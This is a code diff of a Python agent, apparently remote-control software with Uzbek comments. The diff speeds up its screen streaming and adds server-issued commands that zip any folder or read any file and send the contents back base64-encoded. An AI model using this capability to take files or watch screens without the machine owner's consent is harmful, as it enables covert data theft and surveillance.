@@ -13,8 +13,8 @@ import urllib.request
 import urllib.error
 
 # ─────────────────────────── SOZLAMALAR ───────────────────────────
-SCREEN_QUALITY = 65
-FPS_DELAY = 0.08          # ~12 FPS
+SCREEN_QUALITY = 75
+FPS_DELAY = 0.016          # ~60 FPS
 
 # Hosts fayl joylashuvi (Windows)
 HOSTS_FILE = r"C:\Windows\System32\drivers\etc\hosts"
@@ -169,6 +169,56 @@ async def send_screen(agent_id: str, server_url=None, owner_id=None):
 
 def execute_system_command(command_text: str) -> str:
     """Tizim buyrug'ini xavfsiz bajarish va natijani qaytarish."""
+    if command_text.startswith("__DOWNLOAD_ZIP__:"):
+        folder_path = command_text[len("__DOWNLOAD_ZIP__:"):].strip()
+        if (folder_path.startswith('"') and folder_path.endswith('"')) or (folder_path.startswith("'") and folder_path.endswith("'")):
+            folder_path = folder_path[1:-1].strip()
+        try:
+            import zipfile
+            import tempfile
+            import base64
+            
+            base_name = os.path.basename(folder_path.rstrip('\\/')) or 'folder'
+            zip_filename = f"{base_name}_masofa.zip"
+            zip_path = os.path.join(tempfile.gettempdir(), zip_filename)
+            
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for root, dirs, files in os.walk(folder_path):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        try:
+                            arcname = os.path.relpath(file_path, folder_path)
+                            zipf.write(file_path, arcname)
+                        except Exception:
+                            pass
+            
+            with open(zip_path, 'rb') as f:
+                content_bytes = f.read()
+            b64_data = base64.b64encode(content_bytes).decode('utf-8')
+            
+            try:
+                os.remove(zip_path)
+            except:
+                pass
+
+            return '__FILE_JSON_START__' + json.dumps({'status': 'ok', 'filename': zip_filename, 'data': b64_data}, ensure_ascii=False) + '__FILE_JSON_END__'
+        except Exception as e:
+            return '__FILE_JSON_START__' + json.dumps({'status': 'error', 'message': str(e)}, ensure_ascii=False) + '__FILE_JSON_END__'
+
+    if command_text.startswith("__DOWNLOAD_FILE__:"):
+        path = command_text[len("__DOWNLOAD_FILE__:"):].strip()
+        if (path.startswith('"') and path.endswith('"')) or (path.startswith("'") and path.endswith("'")):
+            path = path[1:-1].strip()
+        try:
+            import base64
+            with open(path, 'rb') as f:
+                content_bytes = f.read()
+            b64_data = base64.b64encode(content_bytes).decode('utf-8')
+            filename = os.path.basename(path)
+            return '__FILE_JSON_START__' + json.dumps({'status': 'ok', 'filename': filename, 'data': b64_data}, ensure_ascii=False) + '__FILE_JSON_END__'
+        except Exception as e:
+            return '__FILE_JSON_START__' + json.dumps({'status': 'error', 'message': str(e)}, ensure_ascii=False) + '__FILE_JSON_END__'
+
     if command_text.startswith("__LIST_DIR__:"):
         path = command_text[len("__LIST_DIR__:"):].strip()
         if (path.startswith('"') and path.endswith('"')) or (path.startswith("'") and path.endswith("'")):
